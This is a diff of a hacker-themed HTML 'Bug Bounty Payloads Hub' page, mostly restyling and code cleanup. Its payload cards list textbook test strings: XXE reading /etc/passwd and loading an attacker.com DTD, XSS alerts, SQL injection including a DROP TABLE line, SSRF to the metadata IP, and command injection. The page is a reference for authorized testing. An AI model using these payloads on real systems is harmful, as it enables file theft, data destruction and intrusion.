@@ -3,970 +3,219 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Bug Bounty Payloads Hub - Enhanced</title>
+    <title>Bug Bounty Payloads Hub - Advanced Matrix</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a1a 100%);
+            background: #0c0c0c;
             color: #00ff41;
             min-height: 100vh;
             overflow-x: hidden;
-            position: relative;
         }
-
-        /* Enhanced Matrix Background Animation */
-        .matrix-bg {
+        #matrixCanvas {
             position: fixed;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
+            width: 100vw;
+            height: 100vh;
             z-index: -1;
-            opacity: 0.1;
+            display: block;
         }
-
-        .matrix-column {
-            position: absolute;
-            top: -100px;
-            color: #00ff41;
-            font-family: 'Courier New', monospace;
-            font-size: 14px;
-            line-height: 14px;
-            animation: matrix-fall linear infinite;
-        }
-
-        @keyframes matrix-fall {
-            0% { transform: translateY(-100px); opacity: 1; }
-            100% { transform: translateY(100vh); opacity: 0; }
-        }
-
-        /* Particle System */
-        .particles {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        .particle {
-            position: absolute;
-            width: 2px;
-            height: 2px;
-            background: #00ff41;
-            border-radius: 50%;
-            animation: float 6s linear infinite;
-        }
-
-        @keyframes float {
-            0% { 
-                transform: translateY(100vh) translateX(0px) rotate(0deg);
-                opacity: 0;
-            }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { 
-                transform: translateY(-100px) translateX(100px) rotate(360deg);
-                opacity: 0;
-            }
-        }
-
-        /* Enhanced Header with multiple animations */
-        .header {
-            text-align: center;
-            padding: 3rem 0;
-            background: rgba(0, 0, 0, 0.9);
-            border-bottom: 2px solid #00ff41;
-            box-shadow: 0 0 30px rgba(0, 255, 65, 0.4);
-            position: relative;
-            overflow: hidden;
-            animation: slideInFromTop 1s ease-out;
-        }
-
-        .header::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.1), transparent);
-            animation: scan 3s ease-in-out infinite;
-        }
-
-        @keyframes scan {
-            0% { left: -100%; }
-            50% { left: 100%; }
-            100% { left: -100%; }
-        }
-
-        @keyframes slideInFromTop {
-            0% { transform: translateY(-100%); opacity: 0; }
-            100% { transform: translateY(0); opacity: 1; }
-        }
-
+        .header { text-align: center; padding: 2rem 0; background: rgba(0,0,0,0.9); border-bottom: 2px solid #00ff41; }
         .header h1 {
-            font-size: 3.5rem;
-            text-shadow: 0 0 20px #00ff41;
-            animation: typewriter 3s steps(20) 1s both, glow 2s ease-in-out 4s infinite alternate;
-            white-space: nowrap;
-            overflow: hidden;
-            border-right: 3px solid #00ff41;
-            margin: 0 auto;
-            width: fit-content;
-        }
-
-        @keyframes typewriter {
-            0% { width: 0; }
-            100% { width: 100%; }
-        }
-
-        @keyframes glow {
-            from { 
-                text-shadow: 0 0 20px #00ff41;
-                transform: scale(1);
-            }
-            to { 
-                text-shadow: 0 0 30px #00ff41, 0 0 40px #00ff41, 0 0 50px #00ff41;
-                transform: scale(1.02);
-            }
-        }
-
-        .header p {
-            margin-top: 1rem;
-            font-size: 1.3rem;
-            opacity: 0;
-            animation: fadeInUp 1s ease-out 2s both;
-        }
-
-        @keyframes fadeInUp {
-            0% { opacity: 0; transform: translateY(30px); }
-            100% { opacity: 0.8; transform: translateY(0); }
-        }
-
-        /* Loading animation */
-        .loading-bar {
-            width: 100%;
-            height: 3px;
-            background: rgba(0, 255, 65, 0.2);
-            position: relative;
-            margin-top: 1rem;
-            overflow: hidden;
-        }
-
-        .loading-progress {
-            width: 0%;
-            height: 100%;
-            background: linear-gradient(90deg, #00ff41, #00cc33, #00ff41);
-            animation: loading 4s ease-in-out;
-        }
-
-        @keyframes loading {
-            0% { width: 0%; }
-            50% { width: 70%; }
-            100% { width: 100%; }
-        }
-
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 2rem;
-            animation: fadeIn 1s ease-out 1s both;
-        }
-
-        @keyframes fadeIn {
-            0% { opacity: 0; }
-            100% { opacity: 1; }
-        }
-
-        /* Enhanced Search Bar */
-        .search-bar {
-            margin-bottom: 3rem;
-            text-align: center;
-            position: relative;
-        }
-
-        .search-container {
-            position: relative;
-            display: inline-block;
-            width: 100%;
-            max-width: 600px;
-        }
-
-        .search-input {
-            width: 100%;
-            padding: 1.2rem 3rem 1.2rem 1.5rem;
-            background: rgba(0, 0, 0, 0.8);
-            border: 2px solid #00ff41;
-            border-radius: 30px;
-            color: #00ff41;
-            font-size: 1.1rem;
-            outline: none;
-            transition: all 0.4s ease;
-            position: relative;
-            z-index: 2;
-        }
-
-        .search-input:focus {
-            box-shadow: 0 0 25px rgba(0, 255, 65, 0.6);
-            transform: scale(1.02);
-            border-color: #00cc33;
-        }
-
-        .search-icon {
-            position: absolute;
-            right: 1.2rem;
-            top: 50%;
-            transform: translateY(-50%);
-            color: #00ff41;
-            font-size: 1.2rem;
-            z-index: 3;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; transform: translateY(-50%) scale(1); }
-            50% { opacity: 0.7; transform: translateY(-50%) scale(1.1); }
-        }
-
-        .search-input::placeholder {
-            color: rgba(0, 255, 65, 0.6);
-        }
-
-        /* Glitch effect for search */
-        .search-input:focus::before {
-            content: attr(placeholder);
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: transparent;
-            color: #ff0040;
-            animation: glitch 0.3s linear infinite;
-        }
-
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
-        }
-
-        /* Enhanced Grid */
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(380px, 1fr));
-            gap: 2.5rem;
-            margin-bottom: 3rem;
-        }
-
-        /* Enhanced Cards with more animations */
-        .payload-card {
-            background: rgba(0, 0, 0, 0.9);
-            border: 2px solid #00ff41;
-            border-radius: 15px;
-            padding: 2rem;
-            transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            position: relative;
-            overflow: hidden;
-            opacity: 0;
-            transform: translateY(50px);
-            animation: slideInUp 0.6s ease-out forwards;
-        }
-
-        .payload-card:nth-child(1) { animation-delay: 0.1s; }
-        .payload-card:nth-child(2) { animation-delay: 0.2s; }
-        .payload-card:nth-child(3) { animation-delay: 0.3s; }
-        .payload-card:nth-child(4) { animation-delay: 0.4s; }
-        .payload-card:nth-child(5) { animation-delay: 0.5s; }
-        .payload-card:nth-child(6) { animation-delay: 0.6s; }
-
-        @keyframes slideInUp {
-            0% { opacity: 0; transform: translateY(50px); }
-            100% { opacity: 1; transform: translateY(0); }
-        }
-
-        /* Multiple background effects */
-        .payload-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(0, 255, 65, 0.1), transparent);
-            transition: left 0.6s ease;
-        }
-
-        .payload-card::after {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            background: linear-gradient(45deg, #00ff41, transparent, #00ff41);
-            border-radius: 15px;
-            z-index: -1;
-            opacity: 0;
-            transition: opacity 0.4s ease;
-        }
-
-        .payload-card:hover::before {
-            left: 100%;
-        }
-
-        .payload-card:hover::after {
-            opacity: 0.3;
-            animation: borderGlow 2s ease-in-out infinite;
-        }
-
-        @keyframes borderGlow {
-            0%, 100% { opacity: 0.3; }
-            50% { opacity: 0.6; }
-        }
-
-        .payload-card:hover {
-            transform: translateY(-10px) scale(1.02);
-            box-shadow: 0 15px 40px rgba(0, 255, 65, 0.4);
-            border-color: #00cc33;
-        }
-
-        /* Animated Card Headers */
-        .card-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: 1.5rem;
-            position: relative;
-        }
-
-        .card-icon {
-            font-size: 2rem;
-            margin-right: 1rem;
-            animation: rotate 4s linear infinite;
-        }
-
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .payload-card:hover .card-icon {
-            animation: bounce 0.6s ease-in-out;
-        }
-
-        @keyframes bounce {
-            0%, 20%, 60%, 100% { transform: translateY(0); }
-            40% { transform: translateY(-10px); }
-            80% { transform: translateY(-5px); }
-        }
-
-        .card-title {
-            font-size: 1.4rem;
-            font-weight: bold;
-            position: relative;
-        }
-
-        .card-title::after {
-            content: '';
-            position: absolute;
-            bottom: -5px;
-            left: 0;
-            width: 0;
-            height: 2px;
-            background: #00ff41;
-            transition: width 0.4s ease;
-        }
-
-        .payload-card:hover .card-title::after {
-            width: 100%;
-        }
-
-        /* Enhanced Payload Items */
-        .payload-list {
-            max-height: 350px;
-            overflow-y: auto;
-            background: rgba(0, 0, 0, 0.6);
-            border-radius: 10px;
-            padding: 1.5rem;
-            position: relative;
-        }
-
-        .payload-list::-webkit-scrollbar {
-            width: 8px;
-        }
-
-        .payload-list::-webkit-scrollbar-track {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 4px;
-        }
-
-        .payload-list::-webkit-scrollbar-thumb {
-            background: #00ff41;
-            border-radius: 4px;
-        }
-
-        .payload-item {
-            background: rgba(0, 20, 0, 0.8);
-            margin: 0.8rem 0;
-            padding: 1rem;
-            border-radius: 8px;
-            border-left: 4px solid #00ff41;
-            font-family: 'Courier New', monospace;
-            font-size: 0.95rem;
-            position: relative;
-            cursor: pointer;
-            transition: all 0.4s ease;
-            opacity: 0;
-            transform: translateX(-20px);
-            animation: slideInLeft 0.5s ease-out forwards;
-        }
-
-        .payload-item:nth-child(1) { animation-delay: 0.1s; }
-        .payload-item:nth-child(2) { animation-delay: 0.2s; }
-        .payload-item:nth-child(3) { animation-delay: 0.3s; }
-        .payload-item:nth-child(4) { animation-delay: 0.4s; }
-        .payload-item:nth-child(5) { animation-delay: 0.5s; }
-
-        @keyframes slideInLeft {
-            0% { opacity: 0; transform: translateX(-20px); }
-            100% { opacity: 1; transform: translateX(0); }
-        }
-
-        .payload-item:hover {
-            background: rgba(0, 40, 0, 0.9);
-            transform: translateX(10px) scale(1.01);
-            border-left-color: #00cc33;
-            box-shadow: 0 5px 15px rgba(0, 255, 65, 0.2);
-        }
-
-        /* Enhanced Copy Button */
-        .copy-btn {
-            position: absolute;
-            top: 8px;
-            right: 8px;
-            background: rgba(0, 255, 65, 0.1);
-            border: 1px solid #00ff41;
-            border-radius: 20px;
-            color: #00ff41;
-            cursor: pointer;
-            opacity: 0;
-            transition: all 0.3s ease;
-            font-size: 0.9rem;
-            padding: 5px 10px;
-            backdrop-filter: blur(5px);
-        }
-
-        .payload-item:hover .copy-btn {
-            opacity: 1;
-            transform: scale(1.1);
-        }
-
-        .copy-btn:hover {
-            background: rgba(0, 255, 65, 0.2);
-            transform: scale(1.2);
-            box-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
-        }
-
-        .copy-btn:active {
-            transform: scale(0.95);
-        }
-
-        /* Success animation for copy */
-        .copy-success {
-            animation: copySuccess 0.6s ease-out;
-        }
-
-        @keyframes copySuccess {
-            0% { background: rgba(0, 255, 65, 0.2); }
-            50% { background: rgba(0, 255, 65, 0.6); transform: scale(1.3); }
-            100% { background: rgba(0, 255, 65, 0.2); transform: scale(1.1); }
-        }
-
-        /* Warning Section Enhancement */
-        .warning {
-            background: rgba(255, 0, 0, 0.1);
-            border: 2px solid #ff0000;
-            border-radius: 15px;
-            padding: 2rem;
-            margin-bottom: 2rem;
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-            animation: warningPulse 3s ease-in-out infinite;
-        }
-
-        @keyframes warningPulse {
-            0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.3); }
-            50% { box-shadow: 0 0 30px rgba(255, 0, 0, 0.6); }
-        }
-
-        .warning::before {
-            content: '⚠️';
-            position: absolute;
-            top: -10px;
-            left: 50%;
-            transform: translateX(-50%);
             font-size: 3rem;
-            animation: warningBounce 2s ease-in-out infinite;
+            text-shadow: 0 0 20px #00ff41;
+            font-family: 'Courier New', monospace;
+            letter-spacing: 0.1em;
         }
-
-        @keyframes warningBounce {
-            0%, 100% { transform: translateX(-50%) translateY(0); }
-            50% { transform: translateX(-50%) translateY(-10px); }
+        .header p {
+            margin-top: 0.5rem; font-size: 1.2rem; opacity: 0.8;
         }
-
-        .warning h3 {
-            color: #ff4444;
-            margin-bottom: 1rem;
-            font-size: 1.5rem;
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+        .search-bar { margin-bottom: 2rem; text-align: center; }
+        .search-input {
+            width: 100%; max-width: 500px; padding: 1rem;
+            background: rgba(0,0,0,0.8); border: 2px solid #00ff41;
+            border-radius: 25px; color: #00ff41; font-size: 1rem;
+            outline: none; transition: box-shadow 0.3s ease;
         }
-
-        .warning p {
-            color: #ffaaaa;
-            font-size: 1.1rem;
-            line-height: 1.6;
+        .search-input:focus {
+            box-shadow: 0 0 15px #00ff41cc;
         }
-
-        /* Enhanced Footer */
-        .footer {
-            text-align: center;
-            padding: 3rem;
-            background: rgba(0, 0, 0, 0.9);
-            border-top: 2px solid #00ff41;
-            margin-top: 3rem;
+        .search-input::placeholder { color: #00ff4188; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fit,minmax(350px,1fr)); gap: 2rem; margin-bottom: 2rem; }
+        .payload-card {
+            background: rgba(0,0,0,0.9); border: 2px solid #00ff41; border-radius: 10px; padding: 1.5rem;
+            transition: box-shadow 0.3s, transform 0.3s;
             position: relative;
             overflow: hidden;
         }
-
-        .footer::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 2px;
-            background: linear-gradient(90deg, transparent, #00ff41, transparent);
-            animation: footerScan 4s linear infinite;
+        .payload-card:hover {
+            transform: translateY(-8px) scale(1.01);
+            box-shadow: 0 10px 30px #00ff4155;
+            border-color: #00ff88;
         }
-
-        @keyframes footerScan {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
+        .card-header { display: flex; align-items: center; margin-bottom: 1rem; }
+        .card-icon { font-size: 1.6rem; margin-right: 0.6rem; }
+        .card-title { font-size: 1.15rem; font-weight: bold; }
+        .payload-list { max-height: 300px; overflow-y: auto; background: rgba(0,0,0,0.5); border-radius: 5px; padding: 1rem; }
+        .payload-item {
+            background: rgba(0,20,0,0.86);
+            margin: 0.5rem 0; padding: 0.75rem; border-radius: 4px;
+            border-left: 3px solid #00ff41; font-family: 'Courier New', monospace;
+            font-size: 0.93rem; position: relative; cursor: pointer;
+            transition: background 0.3s, transform 0.3s;
         }
-
-        /* Responsive Design */
+        .payload-item:hover {
+            background: rgba(0,40,0,0.87); transform: translateX(7px);
+        }
+        .copy-btn {
+            position: absolute; top: 5px; right: 5px; background: none; border: none; color: #00ff41; cursor: pointer;
+            opacity: 0; transition: opacity 0.3s;
+            font-size: 0.8rem;
+        }
+        .payload-item:hover .copy-btn { opacity: 1; }
+        .footer { text-align: center; padding: 2rem; background: rgba(0,0,0,0.8); border-top: 2px solid #00ff41; margin-top: 2rem; }
+        .warning {
+            background: rgba(255, 0, 0,0.10); border:2px solid #ff0000;
+            border-radius: 10px; padding: 1rem; margin-bottom: 2rem; text-align:center;
+        }
+        .warning h3 { color: #ff4444; }
+        .warning p { color: #ffaaaa; }
         @media (max-width: 768px) {
-            .header h1 {
-                font-size: 2.5rem;
-            }
-
-            .grid {
-                grid-template-columns: 1fr;
-                gap: 1.5rem;
-            }
-
-            .payload-card {
-                padding: 1.5rem;
-            }
-
-            .search-input {
-                font-size: 1rem;
-                padding: 1rem;
-            }
-        }
-
-        /* Accessibility improvements */
-        @media (prefers-reduced-motion: reduce) {
-            *, *::before, *::after {
-                animation-duration: 0.01ms !important;
-                animation-iteration-count: 1 !important;
-                transition-duration: 0.01ms !important;
-            }
-        }
-
-        /* Focus states for accessibility */
-        .payload-item:focus,
-        .copy-btn:focus,
-        .search-input:focus {
-            outline: 2px solid #00ff41;
-            outline-offset: 2px;
+            .header h1 { font-size: 1.5rem; }
+            .grid { grid-template-columns: 1fr; gap: 1rem; }
+            .payload-card { padding: 1rem; }
+            .search-input { font-size: .9rem; padding: .7rem; }
         }
     </style>
 </head>
 <body>
-    <!-- Matrix Background -->
-    <div class="matrix-bg" id="matrix-bg"></div>
-
-    <!-- Particle System -->
-    <div class="particles" id="particles"></div>
-
+    <canvas id="matrixCanvas"></canvas>
     <div class="header">
         <h1>🔒 Bug Bounty Payloads Hub</h1>
         <p>Advanced Security Testing Arsenal</p>
-        <div class="loading-bar">
-            <div class="loading-progress"></div>
-        </div>
     </div>
-
     <div class="container">
         <div class="warning">
             <h3>⚠️ ETHICAL USAGE ONLY ⚠️</h3>
             <p>These payloads are for authorized security testing and educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.</p>
         </div>
-
         <div class="search-bar">
-            <div class="search-container">
-                <input type="text" class="search-input" placeholder="Search payloads..." id="searchInput">
-                <span class="search-icon">🔍</span>
-            </div>
+            <input type="text" class="search-input" id="searchInput" placeholder="Search payloads...">
         </div>
-
         <div class="grid" id="payloadGrid">
-            <!-- XXE Payloads -->
             <div class="payload-card" data-category="xxe">
-                <div class="card-header">
-                    <span class="card-icon">📄</span>
-                    <h3 class="card-title">XXE Payloads</h3>
-                </div>
+                <div class="card-header"><span class="card-icon">📄</span><h3 class="card-title">XXE Payloads</h3></div>
                 <div class="payload-list">
-                    <div class="payload-item">
-                        &lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"&gt;%remote;]&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
+                    <div class="payload-item">&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&amp;test;&lt;/root&gt;<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
+                    <div class="payload-item">&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
                 </div>
             </div>
-
-            <!-- Header Injection -->
             <div class="payload-card" data-category="header-injection">
-                <div class="card-header">
-                    <span class="card-icon">📡</span>
-                    <h3 class="card-title">Header Injection</h3>
-                </div>
+                <div class="card-header"><span class="card-icon">📡</span><h3 class="card-title">Header Injection</h3></div>
                 <div class="payload-list">
-                    <div class="payload-item">
-                        curl -H "User-Agent: &lt;script&gt;alert('XSS')&lt;/script&gt;" https://target.com
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        X-Forwarded-For: &lt;script&gt;alert(document.domain)&lt;/script&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        Referer: javascript:alert('XSS')
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
+                    <div class="payload-item">curl -H "User-Agent: &lt;script&gt;alert('XSS')&lt;/script&gt;" https://target.com<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
+                    <div class="payload-item">X-Forwarded-For: &lt;script&gt;alert(document.domain)&lt;/script&gt;<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
                 </div>
             </div>
-
-            <!-- SQL Injection -->
             <div class="payload-card" data-category="sqli">
-                <div class="card-header">
-                    <span class="card-icon">🗃️</span>
-                    <h3 class="card-title">SQL Injection</h3>
-                </div>
+                <div class="card-header"><span class="card-icon">🗃️</span><h3 class="card-title">SQL Injection</h3></div>
                 <div class="payload-list">
-                    <div class="payload-item">
-                        ' OR '1'='1' --
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        ' UNION SELECT null,null,version() --
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        '; DROP TABLE users; --
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        ' OR SLEEP(5) --
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
+                    <div class="payload-item">' OR '1'='1' --<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
+                    <div class="payload-item">' UNION SELECT null,null,version() --<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
+                    <div class="payload-item">'; DROP TABLE users; --<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
                 </div>
             </div>
-
-            <!-- XSS Payloads -->
             <div class="payload-card" data-category="xss">
-                <div class="card-header">
-                    <span class="card-icon">⚡</span>
-                    <h3 class="card-title">XSS Payloads</h3>
-                </div>
+                <div class="card-header"><span class="card-icon">⚡</span><h3 class="card-title">XSS Payloads</h3></div>
                 <div class="payload-list">
-                    <div class="payload-item">
-                        &lt;script&gt;alert('XSS')&lt;/script&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;img src=x onerror=alert('XSS')&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        &lt;svg onload=alert('XSS')&gt;
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        javascript:alert('XSS')
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
+                    <div class="payload-item">&lt;script&gt;alert('XSS')&lt;/script&gt;<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
+                    <div class="payload-item">&lt;img src=x onerror=alert('XSS')&gt;<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
                 </div>
             </div>
-
-            <!-- SSRF Payloads -->
             <div class="payload-card" data-category="ssrf">
-                <div class="card-header">
-                    <span class="card-icon">🌐</span>
-                    <h3 class="card-title">SSRF Payloads</h3>
-                </div>
+                <div class="card-header"><span class="card-icon">🌐</span><h3 class="card-title">SSRF Payloads</h3></div>
                 <div class="payload-list">
-                    <div class="payload-item">
-                        http://localhost:80
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        http://127.0.0.1:22
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        file:///etc/passwd
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        http://169.254.169.254/latest/meta-data/
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                </div>
-            </div>
-
-            <!-- Command Injection -->
-            <div class="payload-card" data-category="command-injection">
-                <div class="card-header">
-                    <span class="card-icon">💻</span>
-                    <h3 class="card-title">Command Injection</h3>
-                </div>
-                <div class="payload-list">
-                    <div class="payload-item">
-                        ; ls -la
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        | whoami
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        && cat /etc/passwd
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
-                    <div class="payload-item">
-                        `id`
-                        <button class="copy-btn" onclick="copyPayload(this)">📋 Copy</button>
-                    </div>
+                    <div class="payload-item">http://localhost:80<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
+                    <div class="payload-item">file:///etc/passwd<button class="copy-btn" onclick="copyPayload(this)">📋</button></div>
                 </div>
             </div>
         </div>
     </div>
-
     <div class="footer">
         <p>&copy; 2025 Bug Bounty Payloads Hub | For Ethical Hacking Only</p>
-        <p>Stay updated with the latest security research</p>
     </div>
-
+    <!-- MATRIX RAIN & SEARCH SCRIPTS -->
     <script>
-        // Matrix background effect
-        function createMatrixEffect() {
-            const matrixBg = document.getElementById('matrix-bg');
-            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネハヒフヘホマミムメモヤユヨラリルレロワヲン';
-
-            function createColumn() {
-                const column = document.createElement('div');
-                column.className = 'matrix-column';
-                column.style.left = Math.random() * 100 + 'vw';
-                column.style.animationDuration = (Math.random() * 3 + 2) + 's';
-
-                let text = '';
-                for (let i = 0; i < 20; i++) {
-                    text += chars[Math.floor(Math.random() * chars.length)] + '<br>';
-                }
-                column.innerHTML = text;
-
-                matrixBg.appendChild(column);
-
-                setTimeout(() => {
-                    if (column.parentNode) {
-                        column.parentNode.removeChild(column);
-                    }
-                }, 5000);
+        // Matrix Rain animation using canvas
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+        const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネハヒフヘホマミムメモヤユヨラリルレロワヲン'.split('');
+        const fontSize = 18;
+        let columns = Math.floor(canvas.width / fontSize);
+        let drops = Array(columns).fill(1);
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(12,12,12,0.8)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.font = fontSize + 'px Courier New';
+            columns = Math.floor(canvas.width / fontSize);
+            if (drops.length !== columns) drops = Array(columns).fill(1);
+            for (let i = 0; i < columns; i++) {
+                const text = chars[Math.floor(Math.random()*chars.length)];
+                ctx.fillStyle = '#00ff41';
+                ctx.fillText(text, i*fontSize, drops[i]*fontSize);
+                if (Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
             }
-
-            setInterval(createColumn, 200);
+            requestAnimationFrame(drawMatrix);
         }
+        drawMatrix();
 
-        // Particle system
-        function createParticles() {
-            const particleContainer = document.getElementById('particles');
-
-            function createParticle() {
-                const particle = document.createElement('div');
-                particle.className = 'particle';
-                particle.style.left = Math.random() * 100 + 'vw';
-                particle.style.animationDuration = (Math.random() * 3 + 3) + 's';
-                particle.style.animationDelay = Math.random() * 2 + 's';
-
-                particleContainer.appendChild(particle);
-
-                setTimeout(() => {
-                    if (particle.parentNode) {
-                        particle.parentNode.removeChild(particle);
-                    }
-                }, 8000);
-            }
-
-            setInterval(createParticle, 300);
-        }
-
-        // Enhanced copy functionality
-        function copyPayload(button) {
-            const payloadText = button.parentElement.textContent.replace('📋 Copy', '').trim();
-
-            navigator.clipboard.writeText(payloadText).then(() => {
-                button.classList.add('copy-success');
-                button.innerHTML = '✅ Copied!';
-
-                setTimeout(() => {
-                    button.classList.remove('copy-success');
-                    button.innerHTML = '📋 Copy';
-                }, 2000);
-            }).catch(err => {
-                console.error('Could not copy text: ', err);
-                button.innerHTML = '❌ Error';
-                setTimeout(() => {
-                    button.innerHTML = '📋 Copy';
-                }, 2000);
-            });
-        }
-
-        // Enhanced search functionality
-        function initializeSearch() {
-            const searchInput = document.getElementById('searchInput');
-            const payloadCards = document.querySelectorAll('.payload-card');
-
-            searchInput.addEventListener('input', function() {
-                const searchTerm = this.value.toLowerCase();
-
-                payloadCards.forEach(card => {
-                    const cardText = card.textContent.toLowerCase();
-                    const category = card.getAttribute('data-category');
-
-                    if (cardText.includes(searchTerm) || category.includes(searchTerm)) {
-                        card.style.display = 'block';
-                        card.style.animation = 'fadeIn 0.5s ease-out';
-                    } else {
-                        card.style.display = 'none';
-                    }
-                });
-
-                // Show "no results" message if needed
-                const visibleCards = Array.from(payloadCards).filter(card => 
-                    card.style.display !== 'none'
-                );
-
-                if (visibleCards.length === 0 && searchTerm.length > 0) {
-                    showNoResults();
+        // Search filter (glitchless)
+        document.getElementById('searchInput').addEventListener('input', function() {
+            const searchTerm = this.value.toLowerCase();
+            const cards = document.querySelectorAll('.payload-card');
+            let results = 0;
+            cards.forEach(card => {
+                const text = card.textContent.toLowerCase();
+                if (text.includes(searchTerm)) {
+                    card.style.display = 'block'; results++;
                 } else {
-                    hideNoResults();
+                    card.style.display = 'none';
                 }
             });
-        }
-
-        function showNoResults() {
-            let noResultsDiv = document.getElementById('no-results');
-            if (!noResultsDiv) {
-                noResultsDiv = document.createElement('div');
-                noResultsDiv.id = 'no-results';
-                noResultsDiv.innerHTML = `
